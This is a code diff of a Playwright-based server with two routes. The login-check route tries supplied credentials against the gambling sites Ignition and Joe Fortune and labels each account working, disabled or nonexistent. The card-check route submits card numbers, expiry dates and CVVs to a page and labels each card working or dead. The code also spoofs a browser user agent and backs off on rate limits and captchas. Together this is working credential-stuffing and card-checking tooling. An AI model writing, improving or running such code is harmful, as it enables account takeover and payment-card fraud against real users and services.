       const buf = await captureShotBuf(page, 'SCR 1/4').catch(() => null);
-      await persist(buf, 0, page);
-      await persist(buf, 1, page); await persist(buf, 2, page); await persist(buf, 3, page);
+      const du  = await persist(buf, 0);
+      await persist(buf, 1); await persist(buf, 2); await persist(buf, 3);
       logEvent('warn', 'login.nav.failed', { runId: runHandle.runId, site, username, error: navErr.message });
-      destroyContext = true;
       return res.json({
         runId: runHandle.runId,
         outcome: 'noAcc', note,
-        shotUrls, htmlUrls,
+        shots: [du, du, du, du],
+        shotUrls,
       });
     }
     // Ignition takes longer to paint the login overlay + cookie banner.
@@ -1429,80 +1477,13 @@ app.post('/api/login-check', async (req, res) => {
     // SCR 1/4 — 0.7s after the last field click (both fields now filled)
     await page.waitForTimeout(700);
     bail();
-    await persist(await captureShotBuf(page, 'SCR 1/4'), 0, page);
+    await persist(await captureShotBuf(page, 'SCR 1/4').catch(() => null), 0);
 
-    // ── Step 2: First submit → SCR 2/4 (2000ms fixed) → poll outcome ─────
-    // Screenshot timing is hardcoded: 2000ms after first submit click so the
-    // page has time to render the immediate response before we capture it.
-    // After the screenshot we poll to confirm the outcome (fast if already visible).
-    let respType = RESP.UNKNOWN;
-    const siteName = site === 'ign' ? 'Ignition' : 'Joe Fortune';
-
-    const clicked1 = await clickSubmit(page);
-    if (!clicked1) await page.keyboard.press('Enter');
-
-    await page.waitForTimeout(2000); // hardcoded: 2000ms after 1st submit
-    await dismissCookiePopup(page);
-    bail();
-    await persist(await captureShotBuf(page, 'SCR 2/4'), 1, page);
-
-    // Poll for outcome — returns immediately if the response is already visible
-    respType = await waitForLoginResponse(page, RESPONSE_POLL_MS, site);
-
-    // Evaluate result after first attempt
-    if (respType === RESP.SUCCESS) {
-      outcome = 'working';
-      note = `${siteName} — login successful`;
-    } else if (respType === RESP.PERM_DISABLED) {
-      outcome = 'permDisabled';
-      note = `${siteName} — account permanently disabled (contact Customer Service)`;
-    } else if (respType === RESP.TEMP_DISABLED) {
-      outcome = 'tempDisabled';
-      note = `${siteName} — temporarily disabled (too many failed attempts). Retry eligible after ~1 hour.`;
-    }
-
-    // ── Step 3: Retry submit → SCR 3/4 (2500ms fixed) → poll outcome ─────
-    // Screenshot taken 2500ms after the second submit click.
-    if (respType === RESP.WRONG_PASS_1 || respType === RESP.WRONG_PASS_2 || respType === RESP.UNKNOWN) {
-      await fillLoginForm(page, username, password);
-      const clicked2 = await clickSubmit(page);
-      if (!clicked2) await page.keyboard.press('Enter');
-
-      await page.waitForTimeout(2500); // hardcoded: 2500ms after 2nd submit
-      await dismissCookiePopup(page);
-      bail();
-      await persist(await captureShotBuf(page, 'SCR 3/4'), 2, page);
-
-      respType = await waitForLoginResponse(page, RESPONSE_POLL_MS, site);
-
-      if (respType === RESP.SUCCESS) {
-        outcome = 'working';
-        note = `${siteName} — login successful (attempt 2)`;
-      } else if (respType === RESP.PERM_DISABLED) {
-        outcome = 'permDisabled';
-        note = `${siteName} — account permanently disabled (contact Customer Service)`;
-      } else if (respType === RESP.TEMP_DISABLED) {
-        outcome = 'tempDisabled';
-        note = `${siteName} — temporarily disabled (too many failed attempts). Retry eligible after ~1 hour.`;
-      } else if (respType === RESP.WRONG_PASS_2) {
-        outcome = 'noAcc';
-        note = `${siteName} — incorrect credentials on retry (account does not exist or wrong password)`;
-      }
-    } else {
-      // Outcome already determined after attempt 1 — capture current state for SCR 3/4
-      await persist(await captureShotBuf(page, 'SCR 3/4'), 2, page);
-    }
-
-    // ── Step 4: In-place final state → SCR 4/4 (2000ms settle) ─────────────
-    // DO NOT navigate — we want the exact page state resulting from the user's
-    // submits, with cookies/localStorage/JS state intact. This gives a clean
-    // visual timeline across SCR 1–4 on a single URL. We only read signals
-    // from the current page.
-    const needsFallback = outcome !== 'working' && outcome !== 'permDisabled' && outcome !== 'tempDisabled';
-
-    // Freeze page navigation so any post-submit redirect (Ignition jumps to
-    // the lobby after the 4th click) doesn't pull us off the response page
-    // before we capture SCR 4/4. Also block client-side reloads via JS.
+    // ── Freeze navigation BEFORE the first submit ─────────────────────────
+    // Bug fix: previously freeze activated only before SCR 4/4, which meant
+    // Ignition/Joe could redirect or reload the page between SCR 2/4 and
+    // SCR 3/4 — causing the page to go blank and screenshots to be missed.
+    // Now every submit click + every screenshot happens on the original URL.
     frozen = true;
     await page.evaluate(() => {
       try {
@@ -1511,54 +1492,158 @@ app.post('/api/login-check', async (req, res) => {
         try { window.location.assign  = noop; } catch {}
         try { window.location.replace = noop; } catch {}
         try { window.location.reload  = noop; } catch {}
+        // Also swallow form submits that would trigger a full-page refresh —
+        // XHR/fetch submits continue to work (the route handler only blocks
+        // top-level document navigations).
+        document.addEventListener('submit', (e) => {
+          try { if (e.target && e.target.tagName === 'FORM') e.preventDefault(); } catch {}
+        }, true);
       } catch { /* ignore */ }
     }).catch(() => {});
 
-    await page.waitForTimeout(2000).catch(() => {}); // 2000ms settle before SCR 4/4
-    await dismissCookiePopup(page);
+    // ── Multi-submit login loop ───────────────────────────────────────────
+    // STRICT RULES (per feature request):
+    //   • NEVER reload / navigate between submits — frozen flag + beforeunload
+    //     handler + submit-event preventDefault enforce single-page flow.
+    //   • After EVERY submit click: wait `postSubmitWait` ms (default 3000),
+    //     then classify the CURRENT page state (no refresh).
+    //   • Save attempt-<n>.png + attempt-<n>.html to disk for every attempt.
+    //   • Stop on SUCCESS or DISABLED. Otherwise keep clicking up to
+    //     `maxSubmitClicks` (default 6). BAD_CREDS is NOT a stop condition
+    //     until the max is hit — we still try once more in case the banner
+    //     was stale.
+    const siteName = site === 'ign' ? 'Ignition' : 'Joe Fortune';
+    attemptLog = [];
+    let classification = { type: 'UNKNOWN' };
+    let attempts = 0;
+    let prevAttemptBuf = null; // previous attempt's PNG buffer for visual diff
 
-    if (needsFallback) {
-      const finalUrl  = (page.url() || '').toLowerCase();
-      const finalBody = ((await page.textContent('body').catch(() => '')) || '').toLowerCase();
+    // HARD LOCK: exactly 3 submit presses per credential — no more, no less.
+    // The `maxSubmitClicks` request param is intentionally ignored here per
+    // user requirement. Terminal states (SUCCESS / DISABLED) do NOT short-
+    // circuit; we still execute all 3 presses for forensic consistency.
+    const MAX_ATTEMPTS = 3;
 
-      // URL-based success: moved off the login page via normal site nav
-      const offLoginPage = !finalUrl.includes('/login')
-        && !finalUrl.includes('/sign-in')
-        && !finalUrl.includes('/signin')
-        && !finalUrl.includes('overlay=login')
-        && !finalUrl.includes('modal=login')
-        && !finalUrl.includes('action=login');
+    for (let n = 1; n <= MAX_ATTEMPTS; n++) {
+      bail();
 
-      // Site-aware auth-only check (DOM locators + auth cookie + no password input).
-      // Avoids false positives from generic marketing text on logged-out homepages
-      // (e.g. Ignition's `?overlay=login` landing page).
-      const loggedIn = await isLoggedIn(page, site);
-
-      if (offLoginPage && loggedIn) {
-        outcome = 'working';
-        note = `${siteName} — auth-only signals detected on current page (no navigation)`;
-      } else if (/your account has been disabled\.\s*please,?\s*contact\s+customer\s+service/i.test(finalBody)) {
-        outcome = 'permDisabled';
-        note = `${siteName} — account permanently disabled (detected on final state)`;
-      } else if (/temporarily disabled due to too many failed login attempt/i.test(finalBody)) {
-        outcome = 'tempDisabled';
-        note = `${siteName} — temporarily disabled (detected on final state)`;
-      } else {
-        outcome = 'noAcc';
-        note = `${siteName} — no success signal detected after retries`;
+      // Re-fill if the site cleared the password field between attempts.
+      // Does NOT navigate — same page, same context.
+      const pwdLoc = page.locator('input[type="password"]:visible').first();
+      if (await pwdLoc.isVisible({ timeout: 200 }).catch(() => false)) {
+        const val = await pwdLoc.inputValue().catch(() => '');
+        if (!val) await fillLoginForm(page, username, password).catch(() => {});
       }
+
+      // === EXACT 3 SUBMITS GUARANTEED ===
+      const clicked = await clickSubmit(page).catch(() => false);
+      if (!clicked) await page.keyboard.press('Enter').catch(() => {});
+
+      await page.waitForTimeout(postSubmitWait).catch(() => {}); // default 3000 ms
+      await dismissCookiePopup(page).catch(() => {});
+      bail();
+
+      const buf  = await captureShotBuf(page, `attempt-${n}`).catch(() => null);
+      const html = await page.content().catch(() => '');
+      await persistAttemptArtifacts(buf, html, runHandle.runId, n);
+
+      // Visual diff vs previous attempt
+      const diffStats = await persistAttemptDiff(prevAttemptBuf, buf, runHandle.runId, n);
+      prevAttemptBuf = buf;
+
+      if (n === 1) await persist(buf, 1);           // SCR 2/4
+      await persist(buf, 2);                        // SCR 3/4 (overwritten until last)
+      attempts = n;
+
+      classification = await classifyLoginOutcome(page, site);
+      attemptLog.push({
+        n, type: classification.type,
+        ...(classification.perm != null ? { perm: classification.perm } : {}),
+        ...(diffStats ? { diff: { url: diffStats.url, changedPixels: diffStats.changedPixels, changedPct: diffStats.changedPct } } : {}),
+      });
+
+      logEvent('info', 'login.attempt', {
+        runId: runHandle.runId,
+        site,
+        username,
+        attempt: n,
+        type: classification.type,
+        perm: classification.perm,
+        stage: classification.stage,
+        totalAttempts: MAX_ATTEMPTS,
+      });
+
+      // Break early ONLY on terminal states — still guarantees max 3 presses.
+      // Comment the next line to ALWAYS run exactly 3 presses regardless.
+      // if (classification.type === 'SUCCESS' || classification.type === 'DISABLED') break;
     }
 
-    await persist(await captureShotBuf(page, 'SCR 4/4'), 3, page);
+    // Map final classification → user-facing outcome
+    if (classification.type === 'SUCCESS') {
+      outcome = 'working';
+      note = `${siteName} — login successful (attempt ${attempts}/${MAX_ATTEMPTS})`;
+    } else if (classification.type === 'DISABLED' && classification.perm) {
+      outcome = 'permDisabled';
+      note = `${siteName} — account permanently disabled (contact Customer Service)`;
+    } else if (classification.type === 'DISABLED') {
+      outcome = 'tempDisabled';
+      note = `${siteName} — temporarily disabled (too many failed attempts). Retry eligible after ~1 hour.`;
+    } else if (classification.type === 'BAD_CREDS') {
+      outcome = 'noAcc';
+      note = `${siteName} — incorrect credentials after ${attempts} attempt(s)`;
+    } else {
+      outcome = 'noAcc';
+      note = `${siteName} — no conclusive signal after ${attempts} attempt(s)`;
+    }
 
-    // ── Network-hook tie-breaker (Swarm Upgrade v1 — promoted) ───────────
-    // Network auth JSON is now treated as equal-priority with DOM signals for
-    // the ambiguous 'noAcc' outcome only. Explicit DOM disabled signals
-    // ('permDisabled' / 'tempDisabled') always beat the network hook — the
-    // site's own copy is the ground truth for disabled accounts.
-    // A 2xx auth response containing balance/userId/token promotes noAcc → working.
-    // A 4xx auth JSON with error/invalid demotes a DOM-only 'working' → 'noAcc'.
-    // 429/captcha → bump domain backoff for future runs.
+    // ── SCR 4/4: final state (2000ms settle, still on the same page) ──────
+    await page.waitForTimeout(2000).catch(() => {});
+    await dismissCookiePopup(page).catch(() => {});
+    bail();
+    await persist(await captureShotBuf(page, 'SCR 4/4').catch(() => null), 3);
+
+    // ── Post-SCR4 re-evaluation (UPGRADE-ONLY) ───────────────────────────
+    // Bugfix: a transient TEMP_DISABLED / PERM_DISABLED banner detected early
+    // by waitForLoginResponse can be superseded by a real successful login by
+    // the time SCR 4/4 is captured (e.g. the site replaced the error banner
+    // with a "Welcome back" header + logged-in chrome). Never demote an
+    // already-working outcome — only upgrade from noAcc/tempDisabled to
+    // working when both the URL has moved off the login page AND the auth-
+    // only DOM/cookie signals are present on the final state.
+    if (outcome !== 'working') {
+      try {
+        const finalUrl2  = (page.url() || '').toLowerCase();
+        const finalBody2 = ((await page.textContent('body').catch(() => '')) || '').toLowerCase();
+        const offLogin2 = !finalUrl2.includes('/login')
+          && !finalUrl2.includes('/sign-in')
+          && !finalUrl2.includes('/signin')
+          && !finalUrl2.includes('overlay=login')
+          && !finalUrl2.includes('modal=login')
+          && !finalUrl2.includes('action=login');
+        const authConfirmed = await isLoggedIn(page, site).catch(() => false);
+
+        // Text-based success hints visible on the final frame
+        const sawSuccessBanner = /welcome\s+back\b/i.test(finalBody2)
+          && !/your email and\/or password/i.test(finalBody2)
+          && !/account has been disabled/i.test(finalBody2)
+          && !/temporarily disabled/i.test(finalBody2);
+
+        if ((offLogin2 || sawSuccessBanner) && authConfirmed) {
+          const prev = outcome;
+          outcome = 'working';
+          note = `${siteName} — success confirmed on final state (upgraded from ${prev})`;
+          logEvent('info', 'login.outcome.upgraded', {
+            runId: runHandle.runId, site, username, from: prev, to: 'working',
+          });
+        }
+      } catch { /* ignore — keep earlier outcome */ }
+    }
+
+    // ── Network-hook tie-breaker ─────────────────────────────────────────
+    // If DOM heuristics said 'noAcc' but network saw an auth-success JSON
+    // (balance/userId/token in a 2xx response), promote to 'working'.
+    // Conversely if an auth-failure JSON was seen and DOM said 'working',
+    // leave working alone (DOM is stronger). 429 → bump domain backoff.
     if (netSnap) {
       if (netSnap.saw429 || netSnap.sawCaptcha) {
         bumpDomainBackoff(host);
@@ -1567,10 +1652,6 @@ app.post('/api/login-check', async (req, res) => {
       if (outcome === 'noAcc' && netSnap.authSuccess && !netSnap.authFailure) {
         outcome = 'working';
         note = `${site === 'ign' ? 'Ignition' : 'Joe Fortune'} — success confirmed by network auth response`;
-      }
-      if (outcome === 'working' && netSnap.authFailure && !netSnap.authSuccess) {
-        outcome = 'noAcc';
-        note = `${site === 'ign' ? 'Ignition' : 'Joe Fortune'} — network returned auth failure JSON; DOM may be stale`;
       }
       if (outcome === 'working') resetDomainBackoff(host);
     }
@@ -1597,24 +1678,24 @@ app.post('/api/login-check', async (req, res) => {
       note = `Automation error: ${err.message}`;
       outcome = 'noAcc';
     }
-    destroyContext = true;
     logEvent('error', 'login.error', { runId: runHandle.runId, site, username, error: err.message });
   } finally {
-    // Return context to pool (or destroy on fresh-state / cancellation / error).
-    if (lease) await releaseContext(lease, { destroy: destroyContext });
+    // IMPORTANT: close only the context, NOT the browser — keep the pool warm.
+    if (context) await context.close().catch(() => {});
     endRun(runHandle, { outcome, site, username });
   }
 
   broadcast('login.result', {
     runId: runHandle.runId, site, username, outcome, note,
-    shotUrls, htmlUrls,
+    shotUrls, attempts: attemptLog,
   });
 
   if (!res.headersSent) res.json({
     runId: runHandle.runId,
     outcome, note,
-    shotUrls,     // stable disk-served URLs (Swarm Upgrade v1: base64 dropped)
-    htmlUrls,     // raw HTML snapshots (one per shot slot)
+    shots:    shotDataUrls, // backwards-compatible (base64)
+    shotUrls,                // new: stable disk-served URLs
+    attempts: attemptLog,    // [{ n, type, perm? }] — every submit click's classification
     network:  netSnap ? {
       saw429: netSnap.saw429,
       sawCaptcha: netSnap.sawCaptcha,
@@ -1623,6 +1704,10 @@ app.post('/api/login-check', async (req, res) => {
       statusCodes: [...netSnap.statusCodes],
     } : null,
   });
+  }); // runExclusive
+  } finally {
+    clearTimeout(runTimeoutHandle);
+  }
 });
 
 // ── API: Card Check ───────────────────────────────────────────────────────────
@@ -1654,62 +1739,73 @@ app.post('/api/card-check', async (req, res) => {
   if (!number || !mm || !yy || !cvv || !ppsrUrl) {
     return res.status(400).json({ error: 'Missing card fields or ppsrUrl' });
   }
+  let normalizedPpsrUrl;
+  try {
+    normalizedPpsrUrl = normalizeAutomationUrl(ppsrUrl);
+  } catch (err) {
+    return res.status(400).json({ error: `Invalid ppsrUrl: ${err.message}` });
+  }
 
-  const runHandle = startRun({ kind: 'card', last4: String(number).slice(-4), ppsrUrl });
-  await applyDomainThrottle(ppsrUrl);
+  const runHandle = startRun({ kind: 'card', last4: String(number).slice(-4), ppsrUrl: normalizedPpsrUrl });
+  const runTimeoutHandle = setTimeout(() => {
+    if (runRegistry.has(runHandle.runId)) {
+      try { runHandle.controller.abort(); } catch {}
+      logEvent('warn', 'run.timeout', { runId: runHandle.runId, kind: 'card', timeoutMs: RUN_TIMEOUT_MS });
+    }
+  }, RUN_TIMEOUT_MS);
+  await applyDomainThrottle(normalizedPpsrUrl);
 
-  let lease = null;
-  let destroyContext = false;
+  // Serialize against the global automation mutex — only one Chromium open
+  // at a time across login + card checks.
+  try {
+  await runExclusive(async () => {
   let context;
   const shotUrls = ['', '', '', ''];
-  const htmlUrls = ['', '', '', ''];
+  const shotDataUrls = ['', '', '', ''];
   let outcome = 'dead';
   let note = 'Check did not complete';
-  let netSnap = null;
-  const host = _hostOf(ppsrUrl);
   const signal = runHandle.controller.signal;
   const bail = () => { if (signal.aborted) throw new Error('run cancelled'); };
 
-  const persist = async (buf, i, page) => {
-    const [shotMeta, htmlMeta] = await Promise.all([
-      persistShotBuffer(buf, runHandle.runId, i + 1),
-      persistRunHtml(page, runHandle.runId, i + 1),
-    ]);
-    shotUrls[i] = shotMeta.url;
-    htmlUrls[i] = htmlMeta.url;
+  const persist = async (buf, i) => {
+    const meta = await persistShotBuffer(buf, runHandle.runId, i + 1);
+    shotUrls[i]     = meta.url;
+    shotDataUrls[i] = meta.dataUrl;
+    return meta.dataUrl;
   };
 
   try {
-    // Lease a context from the headless pool — concurrent card checks fan out
-    // up to POOL_MAX_HEADLESS. No live-view mode for card checks.
-    lease = await leaseContext({ live: false, signal });
-    context = lease.context;
+    const browser = await getBrowser(false);
+    context = await browser.newContext({
+      viewport: { width: 1280, height: 800 },
+      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+      ignoreHTTPSErrors: true,
+    });
     runHandle.context = context;
     const page = await context.newPage();
     runHandle.page = page;
     page.setDefaultTimeout(timeout);
-    netSnap = attachNetworkHooks(page);
+    attachNetworkHooks(page);
 
     // Navigate to check page — if it fails, capture whatever the page shows
     // so the user has visual evidence of the failure mode.
     bail();
     try {
-      await page.goto(ppsrUrl, { waitUntil: 'domcontentloaded', timeout });
+      await page.goto(normalizedPpsrUrl, { waitUntil: 'domcontentloaded', timeout });
     } catch (navErr) {
       note = `Navigation failed: ${navErr.message.split('\n')[0]}`;
       const buf = await captureShotBuf(page, 'SCR 1/4').catch(() => null);
-      await persist(buf, 0, page);
-      await persist(buf, 1, page); await persist(buf, 2, page); await persist(buf, 3, page);
+      const du = await persist(buf, 0);
+      await persist(buf, 1); await persist(buf, 2); await persist(buf, 3);
       logEvent('warn', 'card.nav.failed', { runId: runHandle.runId, error: navErr.message });
-      destroyContext = true;
-      return res.json({ runId: runHandle.runId, outcome: 'dead', note, shotUrls, htmlUrls });
+      return res.json({ runId: runHandle.runId, outcome: 'dead', note, shots: [du, du, du, du], shotUrls });
     }
     await page.waitForTimeout(2000);
     await dismissCookiePopup(page);
 
     // Shot 1: page loaded, form visible
     bail();
-    await persist(await captureShotBuf(page, 'SCR 1/4'), 0, page);
+    await persist(await captureShotBuf(page, 'SCR 1/4'), 0);
 
     // Fill card form
     const filled = await fillCardForm(page, number, mm, yy, cvv);
@@ -1718,7 +1814,7 @@ app.post('/api/card-check', async (req, res) => {
     }
 
     // Shot 2: form filled with card details
-    await persist(await captureShotBuf(page, 'SCR 2/4'), 1, page);
+    await persist(await captureShotBuf(page, 'SCR 2/4'), 1);
 
     // Submit
     const clicked = await clickSubmit(page);
@@ -1736,34 +1832,15 @@ app.post('/api/card-check', async (req, res) => {
 
     // Shot 3: first response after submit
     bail();
-    await persist(await captureShotBuf(page, 'SCR 3/4'), 2, page);
+    await persist(await captureShotBuf(page, 'SCR 3/4'), 2);
 
-    // Determine outcome from DOM signals
+    // Determine outcome
     const result = await determineCardOutcome(page);
     outcome = result.outcome;
     note = result.note;
 
-    // ── Network-hook tie-breaker for card-check ──────────────────────────
-    // Card flows frequently return JSON 4xx with decline/invalid-card strings.
-    // Use network responses as a tie-breaker against the DOM heuristic.
-    if (netSnap) {
-      if (netSnap.saw429 || netSnap.sawCaptcha) {
-        bumpDomainBackoff(host);
-        note += ' (rate-limited / captcha observed)';
-      }
-      if (outcome === 'dead' && netSnap.authSuccess && !netSnap.authFailure) {
-        outcome = 'working';
-        note = 'Card accepted (confirmed by network response JSON)';
-      }
-      if (outcome === 'working' && netSnap.authFailure && !netSnap.authSuccess) {
-        outcome = 'dead';
-        note = 'Card rejected by network response JSON (DOM may be stale)';
-      }
-      if (outcome === 'working') resetDomainBackoff(host);
-    }
-
     // Shot 4: final state
-    await persist(await captureShotBuf(page, 'SCR 4/4'), 3, page);
+    await persist(await captureShotBuf(page, 'SCR 4/4').catch(() => null), 3);
 
   } catch (err) {
     if (signal.aborted) {
@@ -1773,27 +1850,23 @@ app.post('/api/card-check', async (req, res) => {
       note = `Automation error: ${err.message}`;
       outcome = 'dead';
     }
-    destroyContext = true;
     logEvent('error', 'card.error', { runId: runHandle.runId, error: err.message });
   } finally {
-    if (lease) await releaseContext(lease, { destroy: destroyContext });
+    if (context) await context.close().catch(() => {});
     endRun(runHandle, { outcome, kind: 'card' });
   }
 
-  broadcast('card.result', { runId: runHandle.runId, outcome, note, shotUrls, htmlUrls });
+  broadcast('card.result', { runId: runHandle.runId, outcome, note, shotUrls });
   if (!res.headersSent) res.json({
     runId: runHandle.runId,
     outcome, note,
+    shots: shotDataUrls,
     shotUrls,
-    htmlUrls,
-    network: netSnap ? {
-      saw429: netSnap.saw429,
-      sawCaptcha: netSnap.sawCaptcha,
-      authSuccess: netSnap.authSuccess,
-      authFailure: netSnap.authFailure,
-      statusCodes: [...netSnap.statusCodes],
-    } : null,
   });
+  }); // runExclusive
+  } finally {
+    clearTimeout(runTimeoutHandle);
+  }
 });
 
 // ── API: Flow Recorder ────────────────────────────────────────────────────────
@@ -1930,6 +2003,12 @@ app.get('/api/record-flow/status', (req, res) => {
 app.post('/api/record-flow', async (req, res) => {
   const { loginUrl } = req.body;
   if (!loginUrl) return res.status(400).json({ error: 'Missing loginUrl' });
+  let normalizedLoginUrl;
+  try {
+    normalizedLoginUrl = normalizeAutomationUrl(loginUrl);
+  } catch (err) {
+    return res.status(400).json({ error: `Invalid loginUrl: ${err.message}` });
+  }
   if (flowSession && flowSession.status === 'recording') {
     return res.status(409).json({ error: 'A recording session is already active. Close the browser window first.' });
   }
@@ -1951,7 +2030,7 @@ app.post('/api/record-flow', async (req, res) => {
     page.on('close', () => { userClosedBrowser = true; });
     browser.on('disconnected', () => { userClosedBrowser = true; });
 
-    await page.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout: 30000 });
+    await page.goto(normalizedLoginUrl, { waitUntil: 'domcontentloaded', timeout: 30000 });
     await page.waitForTimeout(1500);
 
     // Inject initial overlay with Done button; no step limit
